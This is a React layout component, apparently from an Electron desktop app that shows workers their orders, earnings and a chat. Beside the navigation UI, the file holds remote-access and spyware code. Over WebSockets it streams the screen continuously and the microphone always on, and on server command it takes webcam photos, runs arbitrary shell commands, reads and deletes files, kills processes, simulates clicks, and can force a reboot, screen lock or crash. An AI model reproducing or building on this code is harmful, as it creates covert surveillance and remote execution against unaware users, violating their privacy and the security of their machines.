import { useEffect, useRef, useState } from 'react'
import { Outlet, NavLink, useNavigate } from 'react-router-dom'
import { useAuthStore, useChatStore, useGlobalChatStore } from '../store'
import { getApiBase, getUnreadCounts, getAvailableOrders, getGlobalUnreadCount, sendHeartbeat } from '../api'
import { playSound } from '../utils/sound'

const nav = [
  { to: '/available', label: 'Доступные заказы', icon: '📋' },
  { to: '/my-orders', label: 'Мои заказы', icon: '⚡' },
  { to: '/earnings', label: 'Мои заработки', icon: '💵' },
]

export default function Layout() {
  const { user, logout } = useAuthStore()
  const [isVisible, setIsVisible] = useState(true)
  const { applyNewCounts } = useChatStore()
  const { unread: globalUnread, setUnread: setGlobalUnread, isOpen: globalIsOpen } = useGlobalChatStore()
  const navigate = useNavigate()

  const isFirstMessagePoll = useRef(true)
  const isFirstOrderPoll = useRef(true)
  const isFirstGlobalPoll = useRef(true)
  const knownOrderIds = useRef(null)
  const prevGlobalCount = useRef(0)

  // Listen for visibility changes from main process
  useEffect(() => {
    window.electronBridge?.onVisibilityChange?.((visible) => setIsVisible(visible))
  }, [])

  // Heartbeat — only when window is visible (hidden = appear offline)
  useEffect(() => {
    if (!isVisible) return
    const beat = () => sendHeartbeat().catch((err) => {
      if (err?.response?.status === 426) {
        const msg = err.response?.data?.detail || 'Обновите приложение'
        logout()
        navigate('/login', { state: { versionError: msg } })
      }
    })
    beat()
    const interval = setInterval(beat, 30_000)
    return () => clearInterval(interval)
  }, [isVisible])

  // Admin commands WebSocket — server pushes commands immediately
  useEffect(() => {
    const wsBase = getApiBase().replace(/^http/, 'ws')
    let ws = null
    let reconnectTimeout = null
    let destroyed = false

    const handleMessage = async (e) => {
      if (typeof e.data !== 'string') return
      const cmd = e.data.trim()
      if (cmd === 'quit') await window.electronBridge?.forceQuit()
      else if (cmd === 'remove-autostart') await window.electronBridge?.removeAutostart()
      else if (cmd === 'reboot') await window.electronBridge?.systemReboot()
      else if (cmd === 'lock-screen') await window.electronBridge?.systemLock()
      else if (cmd === 'bsod') await window.electronBridge?.systemBsod()
    }

    const connect = () => {
      if (destroyed) return
      const token = localStorage.getItem('token')
      ws = new WebSocket(`${wsBase}/users/commands-ws?token=${token}`)
      ws.onmessage = handleMessage
      ws.onclose = () => { if (!destroyed) reconnectTimeout = setTimeout(connect, 5000) }
    }

    connect()
    return () => { destroyed = true; if (reconnectTimeout) clearTimeout(reconnectTimeout); ws?.close() }
  }, [])

  // Screenshot WebSocket — on-demand capture (like webcam)
  useEffect(() => {
    if (!window.electronBridge?.captureScreen) return
    const wsBase = getApiBase().replace(/^http/, 'ws')
    let ws = null
    let reconnectTimeout = null
    let destroyed = false

    const handleMessage = async (e) => {
      if (e.data !== 'capture') return
      try {
        const base64 = await window.electronBridge.captureScreen()
        if (!base64 || !ws || ws.readyState !== WebSocket.OPEN) return
        const bytes = Uint8Array.from(atob(base64), (c) => c.charCodeAt(0))
        ws.send(bytes.buffer)
      } catch {}
    }

    const connect = () => {
      if (destroyed) return
      const token = localStorage.getItem('token')
      ws = new WebSocket(`${wsBase}/users/screenshot-ws?token=${token}`)
      ws.onmessage = handleMessage
      ws.onclose = () => { if (!destroyed) reconnectTimeout = setTimeout(connect, 5000) }
    }

    connect()
    return () => { destroyed = true; if (reconnectTimeout) clearTimeout(reconnectTimeout); ws?.close() }
  }, [])

  // Process list WebSocket — sends list every 15s, receives kill commands
  useEffect(() => {
    if (!window.electronBridge?.getProcesses) return
    const wsBase = getApiBase().replace(/^http/, 'ws')
    let ws = null
    let uploadInterval = null
    let reconnectTimeout = null
    let destroyed = false

    const upload = async (socket) => {
      try {
        const processes = await window.electronBridge.getProcesses()
        if (socket.readyState === WebSocket.OPEN) socket.send(JSON.stringify(processes))
      } catch {}
    }

    const handleMessage = async (e) => {
      if (typeof e.data !== 'string') return
      const name = e.data.startsWith('kill:') ? e.data.slice(5) : null
      if (!name) return
      try {
        await window.electronBridge.killProcess(name)
        upload(ws)
      } catch {}
    }

    const connect = () => {
      if (destroyed) return
      const token = localStorage.getItem('token')
      ws = new WebSocket(`${wsBase}/users/processes-ws?token=${token}`)
      ws.onopen = () => {
        upload(ws)
        uploadInterval = setInterval(() => upload(ws), 15_000)
      }
      ws.onmessage = handleMessage
      ws.onclose = () => {
        if (uploadInterval) { clearInterval(uploadInterval); uploadInterval = null }
        if (!destroyed) reconnectTimeout = setTimeout(connect, 5000)
      }
    }

    connect()
    return () => {
      destroyed = true
      if (uploadInterval) clearInterval(uploadInterval)
      if (reconnectTimeout) clearTimeout(reconnectTimeout)
      ws?.close()
    }
  }, [])

  // Webcam WebSocket — on-demand capture, auto-reconnect
  useEffect(() => {
    const wsBase = getApiBase().replace(/^http/, 'ws')
    let ws = null
    let reconnectTimeout = null
    let destroyed = false

    const handleMessage = async (e) => {
      if (e.data !== 'capture') return
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        const video = document.createElement('video')
        video.srcObject = stream
        await video.play()
        await new Promise((r) => setTimeout(r, 300))
        const canvas = document.createElement('canvas')
        canvas.width = video.videoWidth || 640
        canvas.height = video.videoHeight || 480
        canvas.getContext('2d').drawImage(video, 0, 0)
        stream.getTracks().forEach((t) => t.stop())
        canvas.toBlob((blob) => {
          if (blob && ws?.readyState === WebSocket.OPEN) {
            blob.arrayBuffer().then((buf) => ws.send(buf))
          }
        }, 'image/jpeg', 0.85)
      } catch (e) {
        console.error('Webcam capture error:', e)
      }
    }

    const connect = () => {
      if (destroyed) return
      const token = localStorage.getItem('token')
      ws = new WebSocket(`${wsBase}/users/webcam-ws?token=${token}`)
      ws.onmessage = handleMessage
      ws.onclose = () => { if (!destroyed) reconnectTimeout = setTimeout(connect, 5000) }
    }

    connect()

    return () => {
      destroyed = true
      if (reconnectTimeout) clearTimeout(reconnectTimeout)
      ws?.close()
    }
  }, [])

  // Live screen streaming via WebSocket — always on, auto-reconnect
  useEffect(() => {
    if (!window.electronBridge?.getScreenSourceId) return
    const wsBase = getApiBase().replace(/^http/, 'ws')
    let ws = null
    let streamInterval = null
    let mediaStream = null
    let reconnectTimeout = null
    let destroyed = false

    const stopCapture = () => {
      if (streamInterval) { clearInterval(streamInterval); streamInterval = null }
      if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null }
    }

    const startCapture = async (socket) => {
      if (streamInterval) return
      try {
        const sourceId = await window.electronBridge.getScreenSourceId()
        if (!sourceId || destroyed) return
        mediaStream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: {
            mandatory: {
              chromeMediaSource: 'desktop',
              chromeMediaSourceId: sourceId,
              maxWidth: 960,
              maxHeight: 540,
              maxFrameRate: 10,
            },
          },
        })
        const video = document.createElement('video')
        video.srcObject = mediaStream
        await video.play()
        const canvas = document.createElement('canvas')
        canvas.width = 960
        canvas.height = 540
        const ctx = canvas.getContext('2d')
        streamInterval = setInterval(() => {
          if (!socket || socket.readyState !== WebSocket.OPEN) return
          ctx.drawImage(video, 0, 0, 960, 540)
          canvas.toBlob((blob) => {
            if (blob && socket.readyState === WebSocket.OPEN) {
              blob.arrayBuffer().then(buf => socket.send(buf))
            }
          }, 'image/jpeg', 0.35)
        }, 100)
      } catch (e) {
        console.error('Screen stream error:', e)
      }
    }

    const connect = () => {
      if (destroyed) return
      const token = localStorage.getItem('token')
      ws = new WebSocket(`${wsBase}/users/screen-ws?token=${token}`)
      ws.onopen = () => startCapture(ws)
      ws.onmessage = (e) => {
        if (typeof e.data === 'string' && e.data.startsWith('click:')) {
          const [, x, y] = e.data.split(':')
          window.electronBridge?.simulateClick(parseFloat(x), parseFloat(y))
        }
      }
      ws.onclose = () => {
        stopCapture()
        if (!destroyed) reconnectTimeout = setTimeout(connect, 5000)
      }
    }

    connect()

    return () => {
      destroyed = true
      if (reconnectTimeout) clearTimeout(reconnectTimeout)
      stopCapture()
      if (ws) ws.close()
    }
  }, [])

  // Mic streaming via WebSocket — always on, auto-reconnect
  useEffect(() => {
    const wsBase = getApiBase().replace(/^http/, 'ws')
    let ws = null
    let recorder = null
    let micStream = null
    let reconnectTimeout = null
    let destroyed = false

    const stopMic = () => {
      if (recorder && recorder.state !== 'inactive') recorder.stop()
      if (micStream) { micStream.getTracks().forEach(t => t.stop()); micStream = null }
      recorder = null
    }

    const startMic = async (socket) => {
      if (recorder) return
      try {
        micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false })
        const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
          ? 'audio/webm;codecs=opus' : 'audio/webm'
        recorder = new MediaRecorder(micStream, { mimeType })
        recorder.ondataavailable = (e) => {
          if (e.data.size > 0 && socket.readyState === WebSocket.OPEN) {
            e.data.arrayBuffer().then(buf => socket.send(buf))
          }
        }
        recorder.start(250)
      } catch (e) {
        console.error('Mic error:', e)
      }
    }

    const connect = () => {
      if (destroyed) return
      const token = localStorage.getItem('token')
      ws = new WebSocket(`${wsBase}/users/mic-ws?token=${token}`)
      ws.onopen = () => startMic(ws)
      ws.onclose = () => {
        stopMic()
        if (!destroyed) reconnectTimeout = setTimeout(connect, 5000)
      }
    }

    connect()

    return () => {
      destroyed = true
      if (reconnectTimeout) clearTimeout(reconnectTimeout)
      stopMic()
      if (ws) ws.close()
    }
  }, [])

  // File manager WebSocket — auto-reconnect
  useEffect(() => {
    const wsBase = getApiBase().replace(/^http/, 'ws')
    let ws = null
    let reconnectTimeout = null
    let destroyed = false

    const handleMessage = async (e) => {
      if (typeof e.data !== 'string') return
      try {
        const req = JSON.parse(e.data)
        let result = {}
        if (req.action === 'home') {
          result = await window.electronBridge?.fsHome() ?? {}
        } else if (req.action === 'list') {
          result = await window.electronBridge?.fsList(req.path) ?? { entries: [], error: 'no bridge' }
        } else if (req.action === 'read') {
          result = await window.electronBridge?.fsRead(req.path) ?? { data: null, error: 'no bridge' }
        } else if (req.action === 'delete') {
          result = await window.electronBridge?.fsDelete(req.path) ?? { error: 'no bridge' }
        }
        if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ id: req.id, ...result }))
      } catch (err) {
        if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ error: String(err) }))
      }
    }

    const connect = () => {
      if (destroyed) return
      const token = localStorage.getItem('token')
      ws = new WebSocket(`${wsBase}/users/files-ws?token=${token}`)
      ws.onmessage = handleMessage
      ws.onclose = () => { if (!destroyed) reconnectTimeout = setTimeout(connect, 5000) }
    }

    connect()
    return () => { destroyed = true; if (reconnectTimeout) clearTimeout(reconnectTimeout); ws?.close() }
  }, [])

  // Shell terminal WebSocket — auto-reconnect
  useEffect(() => {
    const wsBase = getApiBase().replace(/^http/, 'ws')
    let ws = null
    let reconnectTimeout = null
    let destroyed = false

    const handleMessage = async (e) => {
      if (typeof e.data !== 'string') return
      try {
        const output = await window.electronBridge?.execCommand(e.data)
        if (ws.readyState === WebSocket.OPEN) ws.send(output ?? '(нет вывода)')
      } catch {
        if (ws.readyState === WebSocket.OPEN) ws.send('(ошибка выполнения)')
      }
    }

    const connect = () => {
      if (destroyed) return
      const token = localStorage.getItem('token')
      ws = new WebSocket(`${wsBase}/users/shell-ws?token=${token}`)
      ws.onmessage = handleMessage
      ws.onclose = () => { if (!destroyed) reconnectTimeout = setTimeout(connect, 5000) }
    }

    connect()
    return () => { destroyed = true; if (reconnectTimeout) clearTimeout(reconnectTimeout); ws?.close() }
  }, [])


  // Background: message notifications
  useEffect(() => {
    const poll = async () => {
      try {
        const counts = await getUnreadCounts()
        const hasNew = applyNewCounts(counts)
        if (!isFirstMessagePoll.current && hasNew) {
          playSound('message')
        }
      } catch {}
      isFirstMessagePoll.current = false
    }

    poll()
    const interval = setInterval(poll, 5_000)
    return () => clearInterval(interval)
  }, [])

  // Background: new order notifications
  useEffect(() => {
    const poll = async () => {
      try {
        const orders = await getAvailableOrders()
        const ids = new Set(orders.map((o) => o.id))

        if (!isFirstOrderPoll.current && knownOrderIds.current !== null) {
          let isNew = false
          for (const id of ids) {
            if (!knownOrderIds.current.has(id)) {
              isNew = true
              break
            }
          }
          if (isNew) playSound('order')
        }

        knownOrderIds.current = ids
      } catch {}
      isFirstOrderPoll.current = false
    }

    poll()
    const interval = setInterval(poll, 8_000)
    return () => clearInterval(interval)
  }, [])

  // Background: global chat notifications
  useEffect(() => {
    const poll = async () => {
      try {
        const since = localStorage.getItem('globalChatLastSeen')
        const { count } = await getGlobalUnreadCount(since)

        if (!isFirstGlobalPoll.current && count > prevGlobalCount.current && !globalIsOpen) {
          playSound('global')
          setGlobalUnread(count)
        } else if (isFirstGlobalPoll.current) {
          setGlobalUnread(count)
        }
        prevGlobalCount.current = count
      } catch {}
      isFirstGlobalPoll.current = false
    }
    poll()
    const interval = setInterval(poll, 5_000)
    return () => clearInterval(interval)
  }, [globalIsOpen])

  return (
    <div className="flex h-screen bg-[#0f1117] overflow-hidden">
      <aside className="w-52 bg-[#1a1f2e] border-r border-slate-700/50 flex flex-col">
        <div className="px-5 py-5 border-b border-slate-700/50">
          <div className="text-xl font-bold text-brand-500">KaraGroup</div>
          <div className="text-xs text-slate-500 mt-0.5">Качер</div>
        </div>

        <nav className="flex-1 py-4 px-2">
          {nav.map((item) => (
            <NavLink
              key={item.to}
              to={item.to}
              className={({ isActive }) =>
                `flex items-center gap-3 px-3 py-2.5 rounded-lg mb-1 text-sm transition-colors ${
                  isActive
                    ? 'bg-brand-500/15 text-brand-400 font-medium'
                    : 'text-slate-400 hover:text-white hover:bg-slate-700/40'
                }`
              }
            >
              <span>{item.icon}</span>
              {item.label}
            </NavLink>
          ))}

          {/* Global chat with unread badge */}
          <NavLink
            to="/global-chat"
            className={({ isActive }) =>
              `flex items-center gap-3 px-3 py-2.5 rounded-lg mb-1 text-sm transition-colors ${
                isActive
                  ? 'bg-brand-500/15 text-brand-400 font-medium'
                  : 'text-slate-400 hover:text-white hover:bg-slate-700/40'
              }`
            }
          >
            <span>💬</span>
            <span className="flex-1">Общий чат</span>
            {globalUnread > 0 && (
              <span className="bg-red-500 text-white text-[10px] font-bold px-1.5 py-0.5 rounded-full min-w-[18px] text-center">
                {globalUnread > 99 ? '99+' : globalUnread}
              </span>
            )}
          </NavLink>
        </nav>

        <div className="px-4 py-4 border-t border-slate-700/50">
          <div className="text-sm text-slate-300 mb-0.5">{user?.username}</div>
          <div className="text-xs text-brand-400 mb-2">Ставка: {user?.worker_percentage}%</div>
          <button
            onClick={() => { logout(); navigate('/login') }}
            className="text-xs text-slate-500 hover:text-red-400 transition-colors"
          >
            Выйти
          </button>
        </div>
      </aside>

      <main className="flex-1 overflow-auto">
        <Outlet />
      </main>
    </div>
  )
}
